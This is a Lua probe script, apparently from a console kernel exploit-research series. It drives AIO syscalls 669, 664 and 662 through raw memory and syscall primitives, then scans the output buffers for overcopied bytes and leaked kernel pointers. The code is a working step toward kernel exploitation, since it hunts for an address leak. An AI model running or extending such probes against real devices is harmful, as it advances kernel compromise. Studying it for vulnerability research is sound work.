-- CRASH_CLASS: LOW
-- PROBE 74d: 669 IDs output buffer overcopy check
--
-- When 669 submits AIO requests, it copies out allocated IDs to the user
-- buffer (arg5). The ID is a dword (32-bit), but R objects contain kernel
-- pointers at R+0x00 and R+0x08 (curthread addresses). If the copyout
-- writes more than 4 bytes per ID, or if there's padding/alignment slop,
-- kernel data from the R object might leak into the output buffer.
--
-- Also tests: ID stride (dword vs qword), sentinel overcopy detection,
-- batch submit with various counts to detect size-dependent overcopy.

print("=== PROBE 74d: 669 IDS OUTPUT OVERCOPY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function fill_sentinel(addr, len, val)
    val = val or 0xCC
    for i = 0, len - 1 do wb(N(addr) + i, val) end
end

local function hexdump(addr, len, label)
    local out = {}
    for i = 0, len - 1 do
        local b = rb(N(addr) + i)
        if b then out[#out + 1] = string.format("%02X", b)
        else out[#out + 1] = "??" end
        if (i + 1) % 16 == 0 then
            print(string.format("  %s +0x%02X: %s", label or "", i - 15, table.concat(out, " ")))
            out = {}
        end
    end
    if #out > 0 then
        local off = len - #out
        print(string.format("  %s +0x%02X: %s", label or "", off, table.concat(out, " ")))
    end
end

-- Open /dev/zero for AIO
local zero_fd = -1
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end
pcall(function()
    zero_fd = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
end)
print("zero_fd=" .. zero_fd)

if zero_fd < 0 then
    print("FATAL: cannot open /dev/zero")
    return
end

local sc_669 = mk(669)
local sc_662 = mk(662)
local sc_664 = mk(664)

-- ============================================================
-- [A] Single submit: exact byte-level overcopy check
-- ============================================================
print("")
print("[A] Single submit — byte-level overcopy check")

local ids_buf = memory.alloc(256)
fill_sentinel(ids_buf, 256, 0xCC)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

wq(N(reqs), uint64(0))          -- offset
wq(N(reqs) + 8, uint64(16))     -- nbytes
local bh, bl = get_hi_lo(uint64(N(data_buf)))
wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
local rh, rl = get_hi_lo(uint64(N(result_buf)))
wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
wd(N(reqs) + 0x20, zero_fd); wd(N(reqs) + 0x24, 0)

pcall(function()
    sc_669(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf)))
end)

-- Check exactly which bytes were modified
local modified_count = 0
local last_modified = -1
for i = 0, 63 do
    local b = rb(N(ids_buf) + i)
    if b ~= 0xCC then
        modified_count = modified_count + 1
        last_modified = i
    end
end

print(string.format("  modified bytes: %d, last modified offset: +0x%02X", modified_count, last_modified))
print("  first 32 bytes:")
hexdump(ids_buf, 32, "A")

-- Check for kernel pointers in the overcopy area
local kptr_found = 0
for i = 0, 60, 4 do
    local lo = rd(N(ids_buf) + i) or 0
    local hi = rd(N(ids_buf) + i + 4) or 0
    if lo < 0 then lo = lo + 0x100000000 end
    if hi < 0 then hi = hi + 0x100000000 end
    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
        print(string.format("  *** KPTR at ids+0x%02X: 0x%08X%08X ***", i, hi, lo))
        kptr_found = kptr_found + 1
    end
end
print("  kptrs in 64B: " .. kptr_found)

-- Cleanup
local id_val = rd(N(ids_buf)) or 0
if id_val ~= 0 and id_val ~= 0xCCCCCCCC then
    local del_ids = memory.alloc(8)
    local del_st = memory.alloc(8)
    wd(N(del_ids), id_val)

    -- Poll first
    pcall(function() sc_664(uint64(N(del_ids)), uint64(1), uint64(N(del_st))) end)
    -- Delete
    wd(N(del_st), 0)
    pcall(function() sc_662(uint64(N(del_ids)), uint64(1), uint64(N(del_st))) end)
end

if not alive() then print("DEAD after [A]"); return end

-- ============================================================
-- [B] Batch submit: 8 requests, check stride between IDs
-- ============================================================
print("")
print("[B] Batch submit (8 requests) — ID stride check")

local big_ids = memory.alloc(512)
fill_sentinel(big_ids, 512, 0xCC)

-- Build 8 request entries (stride 0x28)
local big_reqs = memory.alloc(8 * 0x28 + 16)
for j = 0, 7 do
    local off = j * 0x28
    wq(N(big_reqs) + off, uint64(0))
    wq(N(big_reqs) + off + 8, uint64(16))
    wd(N(big_reqs) + off + 0x10, bl); wd(N(big_reqs) + off + 0x14, bh)
    wd(N(big_reqs) + off + 0x18, rl); wd(N(big_reqs) + off + 0x1C, rh)
    wd(N(big_reqs) + off + 0x20, zero_fd); wd(N(big_reqs) + off + 0x24, 0)
end

pcall(function()
    sc_669(uint64(1), uint64(N(big_reqs)), uint64(8), uint64(1), uint64(N(big_ids)))
end)

-- Find all modified dwords
local ids_found = {}
for i = 0, 127 do  -- scan 512 bytes / 4
    local d = rd(N(big_ids) + i * 4) or 0
    if d < 0 then d = d + 0x100000000 end
    if d ~= 0xCCCCCCCC then
        ids_found[#ids_found + 1] = {off = i * 4, val = d}
    end
end

print(string.format("  modified dwords: %d", #ids_found))
for k, e in ipairs(ids_found) do
    print(string.format("    [%d] +0x%02X = 0x%08X", k, e.off, e.val))
end

-- Determine stride
if #ids_found >= 2 then
    local stride = ids_found[2].off - ids_found[1].off
    print(string.format("  ID stride: %d bytes (0x%X)", stride, stride))

    if stride > 4 then
        print("  *** STRIDE > 4 — checking inter-ID bytes for kernel data ***")
        for k = 1, math.min(#ids_found - 1, 4) do
            local start_off = ids_found[k].off + 4
            local end_off = ids_found[k + 1].off
            print(string.format("  between ID %d and %d:", k, k + 1))
            for i = start_off, end_off - 1 do
                local b = rb(N(big_ids) + i)
                if b ~= 0xCC then
                    print(string.format("    +0x%02X = 0x%02X (non-sentinel)", i, b))
                end
            end
        end

        -- Kernel pointer check in stride gaps
        for k = 1, math.min(#ids_found - 1, 8) do
            local gap_start = ids_found[k].off
            for j = 0, stride - 8, 4 do
                local lo = rd(N(big_ids) + gap_start + j) or 0
                local hi = rd(N(big_ids) + gap_start + j + 4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    print(string.format("  *** KPTR at +0x%02X: 0x%08X%08X ***",
                        gap_start + j, hi, lo))
                    kptr_found = kptr_found + 1
                end
            end
        end
    end
end

-- Cleanup: delete all IDs
for _, e in ipairs(ids_found) do
    local del_ids = memory.alloc(8)
    local del_st = memory.alloc(8)
    wd(N(del_ids), e.val)
    pcall(function() sc_664(uint64(N(del_ids)), uint64(1), uint64(N(del_st))) end)
    wd(N(del_st), 0)
    pcall(function() sc_662(uint64(N(del_ids)), uint64(1), uint64(N(del_st))) end)
end

if not alive() then print("DEAD after [B]"); return end

-- ============================================================
-- [C] Large batch (64 requests) — full hexdump of ID region
-- ============================================================
print("")
print("[C] Large batch (64 requests)")

local huge_ids = memory.alloc(2048)
fill_sentinel(huge_ids, 2048, 0xCC)

local huge_reqs = memory.alloc(64 * 0x28 + 16)
for j = 0, 63 do
    local off = j * 0x28
    wq(N(huge_reqs) + off, uint64(0))
    wq(N(huge_reqs) + off + 8, uint64(16))
    wd(N(huge_reqs) + off + 0x10, bl); wd(N(huge_reqs) + off + 0x14, bh)
    wd(N(huge_reqs) + off + 0x18, rl); wd(N(huge_reqs) + off + 0x1C, rh)
    wd(N(huge_reqs) + off + 0x20, zero_fd); wd(N(huge_reqs) + off + 0x24, 0)
end

pcall(function()
    sc_669(uint64(1), uint64(N(huge_reqs)), uint64(64), uint64(1), uint64(N(huge_ids)))
end)

-- Count modified bytes
local mod_bytes = 0
local last_mod = -1
for i = 0, 1023 do
    local b = rb(N(huge_ids) + i)
    if b ~= 0xCC then
        mod_bytes = mod_bytes + 1
        last_mod = i
    end
end
print(string.format("  modified bytes: %d, last at +0x%03X", mod_bytes, last_mod))

-- Stride calculation
if mod_bytes > 0 and last_mod >= 0 then
    local expected_4byte = 64 * 4  -- 256 bytes if 4-byte stride
    local expected_8byte = 64 * 8  -- 512 bytes if 8-byte stride
    print(string.format("  expected if 4B stride: %d bytes modified", expected_4byte))
    print(string.format("  expected if 8B stride: %d bytes modified", expected_8byte))
    print(string.format("  actual: %d bytes modified", mod_bytes))

    -- Hexdump first 128 bytes
    print("  first 128 bytes:")
    hexdump(huge_ids, 128, "C")
end

-- Kernel pointer scan in the whole region
local c_kptrs = 0
for i = 0, 1020, 4 do
    local lo = rd(N(huge_ids) + i) or 0
    local hi = rd(N(huge_ids) + i + 4) or 0
    if lo < 0 then lo = lo + 0x100000000 end
    if hi < 0 then hi = hi + 0x100000000 end
    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
        print(string.format("  *** KPTR at +0x%03X: 0x%08X%08X ***", i, hi, lo))
        c_kptrs = c_kptrs + 1
    end
end
print("  C kptrs: " .. c_kptrs)

-- Cleanup
local huge_found = {}
for i = 0, 511 do
    local d = rd(N(huge_ids) + i * 4) or 0
    if d < 0 then d = d + 0x100000000 end
    if d ~= 0xCCCCCCCC and d ~= 0 then
        huge_found[#huge_found + 1] = d
    end
end
for _, id in ipairs(huge_found) do
    local del_ids = memory.alloc(8)
    local del_st = memory.alloc(8)
    wd(N(del_ids), id)
    pcall(function() sc_664(uint64(N(del_ids)), uint64(1), uint64(N(del_st))) end)
    wd(N(del_st), 0)
    pcall(function() sc_662(uint64(N(del_ids)), uint64(1), uint64(N(del_st))) end)
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 74d COMPLETE ===")
